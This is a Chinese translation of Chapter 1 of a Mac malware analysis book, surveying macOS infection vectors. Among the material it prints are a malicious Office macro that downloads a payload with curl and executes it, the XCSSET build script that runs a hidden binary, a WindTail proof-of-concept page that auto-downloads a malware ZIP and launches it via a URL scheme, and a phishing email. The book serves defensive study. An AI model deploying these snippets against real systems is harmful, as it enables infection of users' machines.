> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg4NzkwMDA5NQ==&mid=2247484938&idx=1&sn=007f516a9fb284560a75f1754166cd45

#  MAC恶意软件的艺术【卷Ⅰ】Part1-Chapter1  
网络保安29  红蓝攻防研究实验室   2025-07-07 10:25  
  
Part 1 MAC MALWARE BASICS  
  
在深入探讨高级恶意软件分析主题之前，理解 Mac 恶意软件的基础知识 至关重要。在本书的Part1，我们将探讨这些基础知识，包括：  
  
Chapter 1：感染途径（Infection Vectors）， 恶意软件获得对系统初始访问权限的手段。虽然大多数 Mac 恶意软件依赖于各种 社会工程学 攻击手段，但其他更复杂、更有效的 隐秘感染系统 的方法正日益流行。  
  
Chapter2：持久化驻留机制（Methods of Persistence），恶意软件确保操作系统（通常是在 统启动或用户登录时）能自动重新执行自身。尽管攻击者通常只持续滥用其中一小部分方法，但本书将涵盖恶意软件实现持久驻留的众多隐秘手段。  
  
Chapter3：恶意功能（Capabilities）， 恶意软件用于达成其目标的Payload。灰黑产攻击者编写恶意软件通常是为了追求金融收益，而国家支持的网络间谍恶意软件（state-sponsored cyberespionage malware） 则是为了监视用户和窃密，这两种类型的恶意软件我们都将深入探讨。  
  
Chapter 1   
Infection Vectors  
## 1.0 前言  
  
多年来，从简单的社会工程学技巧到高级的远程零日漏洞利用，恶意软件作者探索和利用各种机制来感染 Mac。在本章中，我们将讨论 Mac 恶意软件作者使用的各种常见感染技术，以及真实的攻击案例。  
  
迄今为止，使用恶意代码感染 Mac 的最流行方法是诱骗用户感染，通常是直接下载并运行恶意代码（相比之下，远程漏洞利用等技术则不那么普遍）。为了实现这一目标，攻击者经常使用常见的社会工程学攻击，包括技术支持诈骗、传播虚假更新、虚假应用程序、木马应用程序以及受感染的盗版应用程序。  
  
当然，Apple 敏锐地意识到 macOS 的感染趋势，以及大多数此类感染需要明确的用户交互才能成功的事实。作为回应，他们积极地引入了各种操作系统级安全机制。  
  
在深入探讨具体感染途径前，让我们先简要梳理MAC的主要防护措施。  
## 1.1 Mac防护机制（Mac Protections）  
  
随着时间推移，Apple 持续加强 macOS 的安全防护机制，核心目标正是阻断用户协助型感染途径。其中最古老的防护措施——文件隔离（File Quarantine），最早随 OS X Leopard（10.5）系统推出。当用户首次打开下载的项目时，文件隔离机制会弹出明确警告，要求用户进行二次确认方可执行文件。Apple 官方文档明确指出：若对文件安全性存疑，应果断点击"取消"。  
  
为应对不断演变的恶意软件感染方式，Apple 在 OS X Mountain Lion（10.8）中引入了门禁（Gatekeeper）。该系统在文件隔离机制的基础上强化校验流程：  
- 核心防护：检查下载项目的代码签名信息；  
  
- 拦截策略：阻止不符合系统策略的项目（例如：缺乏有效开发者ID签名的文件，  
技术细节详见演讲《Gatekeeper Exposed》）；  
  
最新防护升级出现在 macOS Catalina（10.15）的公证（Notarization）要求所有软件必须经 Apple 扫描批准才能运行，但存在的缺陷是截至 Big Sur 系统，仍允许手动运行未公证代码；  
  
案例：Shlayer 早期版本诱导用户执行未公证恶意负载，下图为用户协助绕过公证的引导界面（Shlayer 病毒）：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibRDoZl5cpQsiaDjibhUAoq1NHftJ0633RMvVJMoD2RKMN7V1PUX8rvKYsfGJVGUV8pVodJxo5dwS2TQ/640?wx_fmt=png&from=appmsg "")  
  
新版 Shlayer 采用了更隐蔽的绕过手段——成功骗取 Apple 对恶意软件进行公证。通过 macOS 的 spctl 工具可查看其代码签名信息：  

```
% spctl -a -vvv -t install /Volumes/Install/Installer.app 
/Volumes/Install/Installer.app: accepted
source=Notarized Developer ID
origin=Developer ID Application: Morgan Sipe (4X5KZ42L4B)
```

  
source 字段证实该程序被 Apple 不慎误公证，而且其他恶意软件同样存在被 Apple 错误公证的情况。尽管 Apple 最终会意识到错误并撤销该恶意软件的开发者 ID 以取消公证状态，但往往为时已晚。  
  
虽然本章描述的用户协助型感染途径在过去得以频繁实施，但得益于公证要求的实施，最新版 macOS 通常能成功拦截此类攻击。  
  
尽管如此，这些感染途径仍具现实意义：使用旧版 macOS 的用户持续暴露在风险中；同时攻击者不断绕过防护机制、骗取无意批准或利用 Apple 严格公证流程中的漏洞。关于后者的典型案例，请参阅博客文章《All Your Macs Are Belong To Us: bypassing macOS’s file quarantine, gatekeeper, and notarization requirements》。  
## 1.2 恶意邮件（Malicious Emails）  
  
通过邮件传播恶意软件，攻击者通常采取两种方式：要么直接将恶意软件作为邮件附件发送，要么在邮件中包含最终会导向恶意代码的URL链接。在前者情况下，邮件正文可能包含试图诱使用户打开并运行所附恶意软件的指令。由于恶意附件常伪装成无害文档，用户可能会受骗打开它，从而在无意中感染自己的系统。  
  
2017年研究人员发现一种新型Mac恶意软件，其通过大规模邮件活动针对用户进行攻击。这款名为Dok的恶意软件会伪装成处理目标用户税务申报不一致问题的通知邮件送达。如果用户打开附件（Dokument.zip），会发现一个名称和图标都经过精心设计的文件——这些设计掩盖了它实为恶意应用程序的本质。  
  
由于用户和安全工具通常对包含附件的邮件格外警惕，恶意邮件可能转而采用包含恶意链接的形式。这些链接被打开后，通常会将用户重定向至恶意网站，试图诱骗其下载并运行恶意代码。  
  
本章后续章节将详述攻击者以带恶意链接的邮件作为多阶段感染途径初始步骤的多种案例。  
## 1.3 伪造技术支持（Fake Tech and Support）  
  
另一种用于分发恶意软件的渠道是互联网。作为Mac用户，在浏览网页时很可能遭遇过恶意弹窗。这些弹窗可能源自正规网站上的恶意广告、被劫持或污染的搜索结果，或者通过注册与其他热门网站名称拼写错误或变体相似的恶意域名，仿冒网站诱骗用户。  
  
还有些网站则以免费内容引诱访问者。多数情况下，这些弹窗不会自行安装恶意文件，而是会试图诱迫用户主动感染系统。通常这个过程始于虚假的安全警报或更新提示。  
  
Homebrew，一个促进macOS和Linux软件安装的热门包管理器，其官方站点是brew.sh。2020年，攻击者注册了仿冒域名homebrew.sh，诱导受害者误访该网站。当用户访问时，网站会弹出多个醒目弹窗，宣称用户系统已感染病毒并"出于安全原因已被阻止"。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibRDoZl5cpQsiaDjibhUAoq1NHCCoUMMYibULvOIajEb950Zcic35oPnIdYFtlspolMqwxl6fT0yib1zNjg/640?wx_fmt=png&from=appmsg "")  
  
若用户相信这些警报并拨打所谓的支持电话，可能会被迫安装恶意软件，从而导致其Mac设备遭受感染。正如Mac安全公司Intego指出，这类软件将使攻击者能够"远程访问计算机中的信息，并可能进一步危害系统"。  
## 1.4 伪造软件更新（Fake Updates）  
  
攻击者同样热衷于滥用基于网页的弹窗来展示虚假更新提示。例如通过浏览器弹窗警告提示Adobe Flash Player已过期。这些弹窗通常带有恶意性质，它们提供的下载链接并非合法的Flash更新，而是恶意软件。  
  
伪造的Flash Player更新/Shlayer：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibRDoZl5cpQsiaDjibhUAoq1NHN6cpT3IAzWbyJ6HpGQ2cAKKicJtNvOJHNLZiatEezAQ6SwgqXkUntXtw/640?wx_fmt=png&from=appmsg "")  
  
许多Mac用户会中招此类攻击，他们误认为必须执行此次更新，最终在操作过程中感染恶意程序（通常为流氓广告软件）。  
## 1.5 伪装合法应用（Fake Applications）  
  
攻击者通过仿冒应用程序针对Mac用户进行攻击。他们试图诱骗用户下载并运行伪装成合法软件的恶意应用。与下文将描述的木马化应用不同（此类应用仍保留原始程序功能以掩人耳目），仿冒应用通常只执行恶意负载便立即退出。  
  
例如，Siggen恶意软件曾通过仿冒流行的WhatsApp通讯应用攻击Mac用户。攻击者控制的网站message-whatsapp.com会提供内含应用程序的压缩包。这个名为WhatsAppWeb.zip的下载文件并非官方WhatsApp应用，实际上是个名为WhatsAppService的恶意程序。由于message-whatsapp.com网站精心伪装成正规平台，普通用户难以察觉异常，最终下载并运行该仿冒应用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibRDoZl5cpQsiaDjibhUAoq1NHLkmwxKMlbKKBwuzszRtYP8LgYfrMIRnZt1ANmSQULmgTzlEQSEwEuA/640?wx_fmt=png&from=appmsg "")  
## 1.6 木马化应用（Trojanized Applications）  
  
一个基于木马化应用程序的攻击案例：一家知名加密货币交易所的员工收到要求安装新型加密货币交易软件JMTTrader的邮件，邮件中的链接将导向看似正规的公司网站，该网站诱导下载所谓新应用的源代码和预编译二进制文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibRDoZl5cpQsiaDjibhUAoq1NHCISWJBToB1cklmHIARHMiaGOWXpnstF3n3KQV9nGwH8zCp2c0FnqbcQ/640?wx_fmt=png&from=appmsg "")  
  
在员工下载、安装并运行该应用后，表面一切正常，能够看到加密货币交易所列表，可选择任意平台开始交易：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibRDoZl5cpQsiaDjibhUAoq1NH9XFAbGBPcUqdLz6YAeeIibnZrSLoPOIjRvs1wI5Q2EOWBWyuGc6FZ5A/640?wx_fmt=png&from=appmsg "")  
  
然而尽管应用程序源代码没有异常，但JMTTrader.app的预编译安装包已被秘密植入恶意后门。安装过程中悄然部署了专属后门系统。该特定攻击已归因于Lazarus APT组织——自2018年以来，该组织持续使用同样精密的多层面社会工程策略感染Mac用户。更多关于此攻击及该组织对此感染途径偏好的深度分析，请参见博客文章《  
Pass the AppleJeus  
》。  
## 1.7 盗版与破解应用（Pirated and Cracked Applications）  
  
这是一种略显复杂但仍需用户高度参与的攻击方式，是将恶意软件打包进破解版或盗版应用。在此攻击场景中，恶意软件作者首先破解Adobe Photoshop等热门商业软件，移除其版权或授权限制。随后他们会将恶意软件注入软件安装包，再分发给毫无戒备的用户。下载运行此类破解应用的用户系统将因此遭到感染。  
  
例如2014年，名为iWorm的恶意软件通过盗版Adobe Photoshop和Microsoft Office等热门OS X应用传播。攻击者将感染版软件上传至知名种子网站海盗湾（The Pirate Bay）：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibRDoZl5cpQsiaDjibhUAoq1NHOfuLfIhUd16vibUgMTPDFywK7KiclliaytAxSRAicFeVGGo8U0ElE6kOSA/640?wx_fmt=png&from=appmsg "")  
  
安装这些应用的用户确实能免付软件费用，但代价是遭受隐蔽感染。关于iWorm如何持久感染Mac用户的技术细节，请参见研究报告《  
Invading the core: iWorm's infection vector and persistence mechanism  
》。  
  
近期，攻击者通过VST Crack网站分发名为BirdMiner（LoudMiner）的恶意软件。该恶意程序被发现存在于高端音乐制作软件Ableton Live的破解版安装包中。此外，反病毒公司ESET还发现近100款涉及数字音频和虚拟录音棚技术的盗版应用携带BirdMiner病毒。任何下载安装这些盗版应用的用户都会导致系统遭受感染。  
## 1.8 自定义URL协议滥用（Custom URL Schemes）  
  
攻击者还可以滥用macOS合法功能实现感染，WindTail恶意软件便是典型案例。  
  
WindTail通过滥用macOS多项功能感染用户，包括Safari自动打开"安全"文件的特性以及操作系统注册自定义URL协议的能力。自定义URL协议允许一个应用程序启动另一个应用程序。为感染Mac用户，恶意软件作者首先诱使目标访问恶意网页，该页面会自动下载包含恶意软件的ZIP压缩包。当用户使用Safari浏览器时（其默认启用"下载后打开'安全'文件"选项，如图），浏览器将自动解压此压缩包：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibRDoZl5cpQsiaDjibhUAoq1NHP5ciaBSxvlSLDEQtNeZ39OWWicBCvgr98vdwibJzR1Sx7ZDJoibezanmxA/640?wx_fmt=png&from=appmsg "")  
  
此解压过程至关重要，因为当应用程序从压缩包中提取并存盘时，macOS会立即自动处理该应用——包括在其支持自定义URL协议时注册为URL处理程序。  
  
如需判断应用是否支持自定义URL协议，可手动检查其Info.plist文件（该文件包含应用程序的元数据和配置信息）。查看WindTail的Info.plist可见其声明支持自定义协议openurl2622007：  

```
<?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?>
<plist version=&#34;1.0&#34;>
<dict>
 ...
 <key>CFBundleURLTypes</key>
 <array>
 <dict>
 <key>CFBundleURLName</key>
 <string>Local File</string>
 <key>CFBundleURLSchemes</key>
 <array>
 <string>openurl2622007</string>
 </array>
 </dict>
 </array>
 ...
</dict>
</plist>
```

  
特别注意其中包含CFBundleURLTypes数组，该数组存储WindTail支持的所有URL协议。在此数组内，我们找到描述URL协议的条目，其中CFBundleURLSchemes数组声明了受支持的协议：openurl2622007。  
  
当Safari自动解压应用后，macOS启动服务守护进程（lsd）将解析该应用，提取所有自定义URL协议，并将它们注册到启动服务数据库（该数据库com.apple.LaunchServices-231-v2.csstore存储应用与URL协议的映射关系）。可通过fs_usage等文件监视工具被动观察守护进程的文件操作：  

```
# fs_usage -w -f filesystem
open (R_____) ~/Downloads/Final_Presentation.app lsd
open (R_____) ~/Downloads/Final_Presentation.app/Contents/Info.plist lsd
PgIn[A] /private/var/folders/pw/sv96s36d0qgc_6jh45jqmrmr0000gn/0/
com.apple.LaunchServices-231-v2.csstore lsd
```

  
在此输出中可见macOS内置文件监视器（fs_usage）捕获到启动服务守护进程（lsd）正在打开并解析恶意应用程序，同时访问启动服务数据库（com.apple.LaunchServices-231-v2.csstore）。  
  
此后若通过lsregister命令打印数据库内容，可见新条目已将恶意应用Final_Presentation.app映射至自定义URL协议openurl2622007：  

```
% /System/Library/Frameworks/CoreServices.framework/Versions/A/Frameworks/
LaunchServices.framework/Versions/A/Support/lsregister -dump
BundleClass: kLSBundleClassApplication
...
path: ~/Downloads/Final_Presentation.app
name: usrnode
claimed schemes: openurl2622007:
-------------------------------------------
claim id: Local File (0xbee4)
localizedNames: &#34;LSDefaultLocalizedValue&#34; = &#34;Local File&#34;
rank: Default
bundle: usrnode (0x8c64)
flags: url-type (0000000000000040)
roles: Viewer (0000000000000002)
bindings: openurl2622007:
```

  
当操作系统将恶意软件注册为openurl2622007协议的处理程序后，便可由恶意网站直接启动该程序。  
  
下面的POC代码完整复现了WindTail在用户访问恶意网站时的感染流程：  

```
<html>
<body id=&#34;b&#34; onload=&#34;exploit();&#34;></body> (1)
<script type=&#34;text/javascript&#34;>
 function exploit () {
 var a = document.createElement(&#34;a&#34;);
 var x = document.getElementById(&#34;b&#34;);
 a.setAttribute(&#34;href&#34;,&#34;https://foo.com/malware.zip&#34;);
 a.setAttribute(&#34;download&#34;, &#34;Final_Presentation&#34;);
 x.appendChild(a);
 a.click();       (2)
 // 等待下载解压完成...
 location.replace(&#34;openurl2622007://&#34;);  (3)
 }
</script>
</html>
```

  
页面加载时(1)，该JavaScript代码执行程序化点击(2)，迫使Safari自动下载含有恶意应用（该应用支持自定义URL协议）的ZIP压缩包。下载完成后，Safari自动解压压缩包，触发自定义URL协议的注册流程。随后利用location.replace API发起对新注册协议(3)的请求，从而激活恶意应用。  
  
虽然Safari等浏览器会弹窗警示网页正试图启动应用，且macOS在应用实际启动时可能生成二次警告，但由于攻击者可将应用命名为"Final_Presentation"等看似无害的名称，普通用户很可能受骗点击"允许"和"打开"，最终导致感染。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibRDoZl5cpQsiaDjibhUAoq1NHWdLibe8ibnRscWKl8J1tAwhic5IicGlH4qhncialqQQ2RRafsq4DqmeYrQw/640?wx_fmt=png&from=appmsg "")  
## 1.9 Office 宏代码（Office Macros）  
  
尽管技术相对简单，但包含恶意Microsoft Office宏的文档已成为感染Mac用户的流行手段。宏本质上是可直接嵌入Office文档的命令集。用户可能出于自动化常规任务等正当理由在文档中嵌入宏，但恶意软件作者也可滥用此功能向无害文件注入恶意代码。  
  
由于宏是微软的专利技术，Apple的生产力工具套件（包括Pages和Notes）并不支持此功能。但随着macOS在企业环境中的持续渗透，Microsoft Office套件在macOS上的普及度也急剧上升。黑客与恶意软件作者敏锐捕捉到这一趋势，导致针对Apple用户的宏攻击数量激增。例如，Lazarus APT组织在2019年就曾发起针对Mac用户的宏攻击。  
  
要使基于宏的攻击生效，用户必须在Microsoft Office应用程序（如Word）中打开受感染文档，并点击"启用宏"提示。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibRDoZl5cpQsiaDjibhUAoq1NHGLUBUjgGdRTlCRLwQ490kp4W53c5IdKU2icu1hqAmuXHPIduUiaPeh9A/640?wx_fmt=png&from=appmsg "")  
  
宏代码通常用VBA（Visual Basic for Applications）编写，通过调用AutoOpen和Document_Open等Microsoft API确保恶意代码在文档打开且用户启用宏后自动执行。  
  
使用开源工具olevba可提取嵌入的宏代码。例如下面这段在针对韩国用户的恶意Word文档中发现的宏代码：  

```
% olevba -c &#34;샘플_기술사업계획서(벤처기업평가용.doc&#34;
Sub AutoOpen()
 ...
 #If Mac Then                                      (1)
 sur = &#34;https://nzssdm.com/assets/mt.dat&#34;          (2)
 spath = &#34;/tmp/&#34;: i = 0                            (3)
 Do
 spath = spath & Chr(Int(Rnd * 26) + 97): i = i + 1
 Loop Until i > 12
 res = system(&#34;curl -o &#34; & spath & &#34; &#34; & sur)       (4)
 res = system(&#34;chmod +x &#34; & spath)
 res = popen(spath, &#34;r&#34;)                            (5)
```

  
提取的宏代码在 #If Mac Then 代码块中包含专为Mac设计的逻辑(1)。该代码首先进行初始化操作：设置包含远程URL的变量(2)，并在/tmp目录动态构建随机路径(3)。随后使用curl将远程资源（mt.dat）下载到随机生成的本地路径(4)。下载完成后，调用chmod添加可执行权限并通过popen API执行该文件(5)。此下载项实为持久性macOS后门。  
  
自Office 2016起，macOS版Microsoft Office应用程序便在限制性沙箱中运行，旨在遏制恶意代码的影响。但安全研究人员仍发现多例简单的沙箱逃逸案例。若想深入了解基于宏的攻击及沙箱逃逸如何成为macOS感染途径，请参阅演讲《  
Documents of Doom: Infecting macOS via Office Macros  
》。  
## 1.10 Xcode工程污染（Xcode Projects）  
  
攻击者可以通过受感染的Xcode项目感染macOS开发者，Xcode是开发Apple设备软件的标准IDE。这种感染途径具有高度针对性，XCSSET恶意软件便是典型案例。  
  
当下载并构建受XCSSET污染的Xcode项目时，恶意代码将自动运行，导致开发者的Mac设备被感染。检查受XCSSET感染的Xcode项目，可见其工程文件project.pbxproj中包含执行隐藏目录/.xcassets/下Assets.xcassets脚本的指令。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibRDoZl5cpQsiaDjibhUAoq1NHlgUBfzlRwyxgDdqLEQ0iaEXqaRY6WGz78T9xxx4NKpUjNqvQu7SBFJg/640?wx_fmt=png&from=appmsg "")  
  
构建受感染项目将触发脚本执行。查看Assets.xcassets脚本可见其执行名为xcassets的二进制文件，这正是恶意软件的核心组件：  

```
cd &#34;${PROJECT_FILE_PATH}/xcuserdata/.xcassets/&#34;
xattr -c &#34;xcassets&#34;
chmod +x &#34;xcassets&#34;
./xcassets &#34;${PROJECT_FILE_PATH}&#34; true%
```

  
该脚本首先进入隐藏的/.xcassets/目录，然后通过xattr清除xcassets二进制文件的扩展属性，再通过chmod添加可执行权限（+x），最后执行该二进制文件并传入工程路径等参数。  
## 1.11 供应链攻击（Supply Chain Attacks）  
  
一种高级的感染目标系统的方法是入侵分发第三方软件的正规开发者或商业网站，这类所谓的供应链攻击既高效又难以检测。例如2017年中，攻击者成功入侵热门视频转码工具HandBrake的官方网站，借此篡改合法转码程序，将其重新打包为携带名为Proton的恶意软件的版本。  
  
2018年，另一起供应链攻击针对知名Mac应用网站macupdate.com。黑客篡改该网站下载链接，将Firefox等热门macOS应用的下载地址替换为携带CreativeUpdate恶意软件的木马化版本：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibRDoZl5cpQsiaDjibhUAoq1NHolBCpzJIoRolkHqjible4uGsEwf3GYuEiaxD3kLQWTb2Mx1cr6guw1AQ/640?wx_fmt=png&from=appmsg "")  
  
本章到目前为止讨论的大多数攻击和感染途径，应能通过macOS 10.15+引入的应用公证要求得到完全或部分遏制。如前所述，该要求确保所有软件必须经Apple扫描批准方可在macOS运行。然而，感染Mac系统的其他途径依然存在。  
## 1.12 远程服务凭证破解（Account Compromises of Remote Services）  
  
在macOS上，用户可启用并配置RDP、SSH等外部暴露服务，以实现远程内容共享或合法远程系统访问。然而若服务配置不当或使用弱密码/泄露密码保护，攻击者便能获得系统访问权限，从而执行恶意代码。  
  
FruitFly恶意软件感染途径曾多年成谜。2018年FBI的调查报告揭示了该软件感染远程系统的精确方式：  
入侵外部暴露服务  
。报告指出：  
  
"攻击途径包括扫描识别外部暴露服务（含Apple文件传输协议AFP/端口548、RDP或其他VNC、SSH/端口22、以及Back to My Mac/BTMM），这些服务会因弱密码或第三方数据泄露获得的密码而遭攻击"。  
  
2020年，攻击者将IPStorm恶意软件从Windows/Linux移植至macOS。该软件通过暴力破解SSH账户感染远程系统（包括启用SSH的macOS设备）。一旦猜中有效用户名和密码，即下载并执行恶意负载到远程系统。下面展示了IPStorm在远程系统安装自身的逻辑片段：  

```
int ssh.InstallPayload(...) {
 ssh.SystemInfo.GoArch(...);  // 获取远程系统架构信息
 statik.GetFileContents(...); // 下载兼容负载
 ssh.(*Session).Start(...);   // 执行负载
}
```

  
IPStorm调用GoArch方法收集远程系统信息（如架构类型），据此通过GetFileContents下载兼容负载，最终在远程系统执行负载实现持久感染。  
## 1.13 漏洞利用（Exploits）  
  
多数macOS感染途径需大量用户交互（如下载运行恶意程序），且新版macOS防护机制已能阻断此类攻击。相比之下，漏洞利用更为隐蔽——它们能在无用户交互、无系统级防护检测的情况下静默安装恶意软件。  
  
漏洞利用指通过安全漏洞执行攻击者指定代码技术。  
零日漏洞利用  
针对尚无补丁的漏洞，堪称终极感染途径。即便厂商发布零日漏洞补丁，未更新系统的用户仍处风险中，攻击者常专门针对此类用户。  
  
攻击者常试图挖掘或购买浏览器、邮件/聊天客户端等应用的漏洞，将可远程投递的漏洞利用武器化。例如最猖獗的Mac恶意软件之一Flashback，曾利用未修复的Java漏洞感染超50万台Mac设备。  
  
2019年，黑客使用Firefox零日漏洞向完全打补丁的macOS系统部署恶意软件。以下钓鱼邮件诱骗目标用户访问含漏洞利用代码的恶意网站：  

```
Dear XXX,
My name is Neil Morris. I’m one of the Adams Prize Organizers.
Each year we update the team of independent specialists who 
could assess the quality of the competing projects: http://people
.ds.cam.ac.uk/nm603/awards/Adams_Prize
Our colleagues have recommended you as an experienced spe-cialist in this !eld. We need your assistance in evaluating several 
projects for Adams Prize.
Looking forward to receiving your reply.
Best regards,
Neil Morris
```

  
若用户通过Firefox访问该网站，零日漏洞将静默安装持久性macOS后门。而幸运的是，零日漏洞部署恶意软件尚属罕见，但我们依然不能低估此类能力的使用（尤其来自高级APT组织和国家支持的黑客团体）。当然，只要肯付费，任何人都能获得此类漏洞利用工具。  
  
下图展示了发送给网络间谍公司HackingTeam的泄露邮件，其中兜售针对Apple系统的漏洞利用工具。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/975QoDl7XibRDoZl5cpQsiaDjibhUAoq1NHnnZjuvMRrJ1qnapqYHmgRQgR5CPwrkASssR9yQyelF1uomI7w3wPPw/640?wx_fmt=png&from=appmsg "")  
  
该公司最终以45,000美元购得一个Flash零日漏洞。随着Apple持续强化macOS安全机制，攻击者将被迫放弃低效的用户协助型感染途径，转而通过漏洞利用成功感染macOS用户。  
## 1.14 物理攻击（Physical Access）  
  
本章迄今讨论的所有感染途径均为远程攻击，即攻击者在攻击过程中并不实际位于目标系统所在地。远程攻击具备多项优势：突破地理限制、可规模化感染全球目标、提升攻击者隐蔽性（若操作谨慎，几乎不可能被追踪或物理抓捕）。  
  
但其核心缺陷在于成功率难以保障。当攻击者获得计算机的物理接触权限时，感染成功率将大幅提升。不过实施物理攻击需满足两个前提：  
  
1) 实际接触目标系统；2) 承担更高的现场暴露风险。  
  
同时，物理攻击通常仍需依赖漏洞利用技术。尽管普通黑客可能缺乏资源或不愿承担此类风险，但追求高价值目标的国家级黑客组织已被证实会实施此类攻击。  
  
例如《  
WikiLeaks Reveals How the CIA Can Hack Mac's Hidden Code  
》一文中提及的泄露政府文件详述了某攻击组织利用可扩展固件接口（EFI）漏洞的能力，此类漏洞存在于操作系统启动前的引导代码中，其植入的恶意负载难以检测和清除。由于被利用的漏洞可能存在于只读存储器（ROM）中，软件补丁往往无法修复。更多关于EFI和引导程序攻击的技术细节，请参阅《  
BootBandit: A macOS bootloader attack  
》。  
  
当然，基于EFI的低级漏洞利用并非物理攻击者的唯一选择。本地攻击者还可利用其他漏洞（如USB协议栈漏洞），即使目标Mac处于锁定状态。典型案例：旧版macOS存在可靠利用的USB协议漏洞，攻击者仅需插入USB设备（无论目标系统是否解锁）即可触发该未公开漏洞。由于漏洞代码以root权限运行，成功利用可导致系统完全失陷。  
  
因可越狱iPhone而出名的Checkm8漏洞被证实同样影响Apple非移动设备（如搭载T2芯片的Mac/MacBook）。攻击者获得目标系统物理接触权限后，可滥用此漏洞感染macOS系统。  
## 1.15 下章预告  
  
掌握感染途径后，第二章将解析恶意软件如何实现持久化驻留（Persistence）。  
  
  
注：  
本合集为外网公开英文电子书《The Art of Mac Malware》的译文，点击阅读原文查看原版文章。因为讲MAC安全的资料相对比较少，所以翻译一下共同学习，对MAC安全感兴趣的可以关注此合集。翻译不易转载请标明出处。  
  
